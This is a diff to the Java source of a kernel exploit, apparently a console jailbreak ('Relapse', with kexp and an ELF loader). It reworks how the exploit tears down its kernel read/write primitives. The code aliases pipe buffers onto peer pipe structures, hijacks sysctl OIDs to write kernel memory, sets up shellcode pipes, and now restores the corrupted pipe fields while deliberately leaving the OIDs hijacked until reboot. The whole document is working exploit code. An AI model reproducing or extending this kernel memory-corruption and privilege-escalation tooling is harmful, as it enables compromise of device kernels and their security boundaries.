@@ -132,8 +132,8 @@ private static long aioInfoAddr;
 private static RelapsePipe master;
 private static RelapsePipe victim;
 
-/* kexp's crossed shell pipes; kept so the clean-up path can null their buffer
- * pointers (pipe_free_kmem no-op) before the process exits. */
+/* kexp's crossed shell pipes; kept so the clean-up path can make them ordinary
+ * again before the process exits. */
 private static RelapsePipe shellMaster;
 private static RelapsePipe shellVictim;
 
@@ -1316,16 +1316,6 @@ private static PipeInfo findPipe(long fdp, int fd, String label) {
     return new PipeInfo(pipe, isReadEnd);
 }
 
-/* Null a crossed pipe's pipe_buffer.buffer (and size) via the kernel R/W so
- * that, when the fd is finally closed, pipe_free_kmem() frees nothing instead
- * of running free() on the aliased peer-pipe object.  Safe for any pipe that is
- * NOT the fast-R/W primitive itself (i.e. the shell pipes). */
-private static void disarmCrossedPipe(RelapsePipe pipe) {
-    if (pipe == null) return;
-    writeKernel64Fast(pipe.pipe + off.pipeBuffer, 0);
-    writeKernel32Fast(pipe.pipe + off.pipeSize, 0);
-}
-
 private static boolean locatePipes() {
     long fdp = readKernelPointerSlow(curproc + off.procFd);
     if (fdp == 0) {
@@ -1337,6 +1327,8 @@ private static boolean locatePipes() {
     long[] locatedPipes = new long[2];
     int[] locatedReadFd = new int[2];
     int[] locatedWriteFd = new int[2];
+    long[] locatedBuffers = new long[2];
+    int[] locatedSizes = new int[2];
 
     for (int i = 0; i < 2; i++) {
         String label = (i == 0) ? "master" : "victim";
@@ -1365,13 +1357,26 @@ private static boolean locatePipes() {
             return false;
         }
 
+        long originalBuffer = readKernelPointerSlow(info.pipe + off.pipeBuffer);
+        SysctlResult originalSize = kread32Slow(info.pipe + off.pipeSize);
+        if (originalBuffer == 0 || originalSize.rv != 0 || originalSize.value == 0) {
+            Status.println("Pipes: " + label + " pipe buffer could not be recorded");
+            return false;
+        }
+
         locatedPipes[i] = info.pipe;
         locatedReadFd[i] = readFd;
         locatedWriteFd[i] = writeFd;
+        locatedBuffers[i] = originalBuffer;
+        locatedSizes[i] = originalSize.value;
     }
 
     master = new RelapsePipe(locatedPipes[0], locatedReadFd[0], locatedWriteFd[0], true);
     victim = new RelapsePipe(locatedPipes[1], locatedReadFd[1], locatedWriteFd[1], true);
+    master.originalBuffer = locatedBuffers[0];
+    master.originalSize = locatedSizes[0];
+    victim.originalBuffer = locatedBuffers[1];
+    victim.originalSize = locatedSizes[1];
 
     Status.println("master pipe fd: " + master.readFd + "/" + master.writeFd);
     Status.println("victim pipe fd: " + victim.readFd + "/" + victim.writeFd);
@@ -1694,6 +1699,13 @@ private static boolean defuseAioGroups() {
 /* restore / cleanup                                                     */
 /* ===================================================================== */
 
+/* Restore the three hijacked OIDs through the fast pipe primitive.
+ *
+ * Kept for reference, but no longer called from cleanup: the fast primitive
+ * cannot repair the last pipe (each aim overwrites the field being repaired),
+ * while restoring these OIDs kills the slow window that can.  The OIDs are
+ * therefore deliberately left hijacked until the next boot; the pipes are
+ * repaired with the slow window instead. */
 private static void restoreOids() {
     if (!crossed) return;
 
@@ -1728,22 +1740,60 @@ private static void restoreOids() {
     if (!ok) Status.println("Cleanup: oid restore check failed");
 }
 
-private static void restorePipes() {
-    if (!crossed) return;
-    crossed = false;
-
-    if (aimVictim(master.pipe, 0, (int) pipeSize) != 0) {
-        Status.println("Cleanup: could not aim the victim at the master, leaving both armed");
-        return;
+/* Restore a pipe's own buffer/size and empty it.  The slow sysctl window is
+ * used (not the crossed pipes) because the fast primitive cannot restore the
+ * last pipe without re-aiming it at a struct: every fast write starts by
+ * overwriting the field being repaired.  Closing a pipe whose buffer alias is
+ * not repaired hands pipe_free_kmem() a peer struct instead of the vm_map
+ * allocation, which panics the console at process exit. */
+private static boolean restorePipeStruct(RelapsePipe pipe, String label) {
+    if (pipe == null) return true;
+    if (pipe.originalBuffer == 0 || pipe.originalSize == 0) {
+        Status.println("Cleanup: " + label + " pipe has no recorded buffer");
+        return false;
     }
 
-    long zeroed = alloc(0x20);
-    int written = write(victim.writeFd, zeroed, 0x18);
-    int readBack = read(victim.readFd, drainBuffer, 0x18);
-    boolean nulled = (written == 0x18 && readBack == 0x18 &&
-        readU32(drainBuffer, off.pipeBuffer) == 0 && readU32(drainBuffer, off.pipeBuffer + 4) == 0);
+    boolean ok = false;
+    for (int attempt = 0; attempt < 3 && !ok; attempt++) {
+        boolean wrote = kwrite32Slow(pipe.pipe + off.pipeCount, 0) == 0;
+        wrote &= kwrite32Slow(pipe.pipe + off.pipeIn, 0) == 0;
+        wrote &= kwrite32Slow(pipe.pipe + off.pipeOut, 0) == 0;
+        wrote &= kwrite32Slow(pipe.pipe + off.pipeSize, pipe.originalSize) == 0;
+        wrote &= kwrite64Slow(pipe.pipe + off.pipeBuffer, pipe.originalBuffer) == 0;
 
-    if (!nulled) Status.println("Cleanup: pipe buffer was not cleared");
+        SysctlResult count = kread32Slow(pipe.pipe + off.pipeCount);
+        SysctlResult in = kread32Slow(pipe.pipe + off.pipeIn);
+        SysctlResult out = kread32Slow(pipe.pipe + off.pipeOut);
+        SysctlResult size = kread32Slow(pipe.pipe + off.pipeSize);
+        SysctlResult buffer = kread64Slow(pipe.pipe + off.pipeBuffer);
+        ok = wrote
+            && count.rv == 0 && count.value == 0
+            && in.rv == 0 && in.value == 0
+            && out.rv == 0 && out.value == 0
+            && size.rv == 0 && size.value == pipe.originalSize
+            && buffer.rv == 0 && buffer.longValue == pipe.originalBuffer;
+    }
+
+    if (!ok) Status.println("Cleanup: " + label + " pipe restore failed");
+    return ok;
+}
+
+private static void restorePipes() {
+    boolean any = (shellMaster != null || shellVictim != null || master != null || victim != null);
+    if (!any) return;
+    crossed = false;
+
+    /* Shell pipes first, then the fast-R/W pair.  Every write goes through the
+     * slow window, so the order is not load-bearing; the master itself is
+     * restored third, which is also the write that ends the fast primitive. */
+    boolean ok = true;
+    ok &= restorePipeStruct(shellMaster, "kexp master");
+    ok &= restorePipeStruct(shellVictim, "kexp victim");
+    ok &= restorePipeStruct(master, "master");
+    ok &= restorePipeStruct(victim, "victim");
+
+    Status.println(ok ? "Cleanup: all pipes restored (close should be safe)"
+                      : "Cleanup: at least one pipe is still armed (reboot after closing)");
 }
 
 private static void releaseAioWorkers() {
@@ -1803,8 +1853,8 @@ private static void cleanup() {
             else Status.println("Cleanup: current process unavailable");
         }
 
-        restoreOids();
         restorePipes();
+        Status.println("Cleanup: sysctl OIDs left hijacked until reboot");
         releaseAioWorkers();
         closeScratchDescriptors();
     } catch (Throwable t) {
@@ -1813,10 +1863,12 @@ private static void cleanup() {
 }
 
 /* Post-launch teardown.  elfldr is up and no longer needs any of the crossed
- * pipes, so (like the original) we put the kernel back and NULL every crossed
- * pipe's buffer pointer so pipe_free_kmem() is a no-op when the fds close at
- * process exit.  No f_count holds -- holding leaks the files (BUDGET_FD_FILE)
- * and the app budget then tears the system down on close. */
+ * pipes: kexp ran on its own pipe2 and has returned.  Put both the shell pipes
+ * and the fast-R/W pipes back to ordinary buffers through the slow window so
+ * pipe_dtor() frees real allocations when the fds close at process exit.  The
+ * OIDs stay hijacked because the window that repairs the pipes cannot restore
+ * itself.  No f_count holds -- holding leaks the files (BUDGET_FD_FILE) and the
+ * app budget then tears the system down on close. */
 private static void cleanupAfterLaunch() {
     try {
         restoreThreadAttributes();
@@ -1828,13 +1880,8 @@ private static void cleanupAfterLaunch() {
             else Status.println("Post-launch cleanup: current process unavailable");
         }
 
-        /* Null the kexp shell pipes' buffers first (they are not the fast
-         * primitive, so this is a clean direct write via master/victim). */
-        disarmCrossedPipe(shellMaster);
-        disarmCrossedPipe(shellVictim);
-
-        restoreOids();      /* uses the fast primitive, must come before restore */
-        restorePipes();     /* nulls the master pipe buffer; ends the primitive  */
+        restorePipes();     /* slow window; restores shell + primitive pipes */
+        Status.println("Post-launch cleanup: sysctl OIDs left hijacked until reboot");
         releaseAioWorkers();
         closeScratchDescriptors();
     } catch (Throwable t) {
@@ -1868,12 +1915,18 @@ private static RelapsePipe makeShellcodePipe(String label) {
 
     /* Not tracked by closeScratchDescriptors: after crossShellcodePipes() the
      * master's pipe_buffer.buffer aliases the victim pipe struct, so a plain
-     * close would free a uma object through the malloc path.  cleanupAfterLaunch
-     * nulls both shell buffers (disarmCrossedPipe) before exit so the eventual
-     * close at process teardown is a pipe_free_kmem no-op. */
+     * close would free a uma object through the malloc path.  The pipe's own
+     * buffer/size are recorded here and written back by restorePipes() before
+     * exit so the eventual close is a normal pipe teardown. */
     PipeInfo info = findPipe(fdp, readFd, "shellcode " + label);
     if (info == null || !info.isReadEnd) {
         throw new RuntimeException("shellcode " + label + " pipe self-check failed");
+    }
+
+    long originalBuffer = readKernelPointerSlow(info.pipe + off.pipeBuffer);
+    SysctlResult originalSize = kread32Slow(info.pipe + off.pipeSize);
+    if (originalBuffer == 0 || originalSize.rv != 0 || originalSize.value == 0) {
+        throw new RuntimeException("shellcode " + label + " pipe buffer could not be recorded");
     }
 
     /*
@@ -1881,7 +1934,10 @@ private static RelapsePipe makeShellcodePipe(String label) {
      * matching kexp.js prepareShellcodePipes(). kexp resets the pipe head
      * through the crossed master end before its first use.
      */
-    return new RelapsePipe(info.pipe, readFd, writeFd, true);
+    RelapsePipe pipe = new RelapsePipe(info.pipe, readFd, writeFd, true);
+    pipe.originalBuffer = originalBuffer;
+    pipe.originalSize = originalSize.value;
+    return pipe;
 }
 
 /* Cross the fresh shellcode pipes exactly like kexp.js prepareShellcodePipes. */
@@ -2000,11 +2056,11 @@ public static void main(String[] args) {
         NativeInvoke.sendNotificationRequest("Relapse fatal: " + t.getMessage());
     } finally {
         /* Poops does not tear down the kernel-side pipe state after kexp has
-         * run either.  Restoring or closing the crossed pipes while the
-         * loader is alive can free a pipe structure through the buffer
-         * pointer and take the app down.  Only clean up on failure paths. */
+         * run either.  Restoring the crossed pipes while the loader is alive
+         * can free a pipe structure through the buffer pointer and take the
+         * app down.  Only clean up on failure paths. */
         if (launched) {
-            Status.println("post-launch cleanup: restoring oids, keeping crossed pipes");
+            Status.println("post-launch cleanup: restoring pipes, OIDs left hijacked");
             cleanupAfterLaunch();
             Status.println("Relapse main returning");
         } else {
@@ -2040,6 +2096,11 @@ static class RelapsePipe {
     int readFd;
     int writeFd;
     boolean isReadEnd;
+    /* The pipe's own buffer and size, captured before the crossing overwrites
+     * them.  Teardown writes them back so pipe_dtor() frees a real allocation
+     * instead of the peer's struct. */
+    long originalBuffer;
+    int originalSize;
     RelapsePipe(long pipe, int readFd, int writeFd, boolean isReadEnd) {
         this.pipe = pipe;
         this.readFd = readFd;
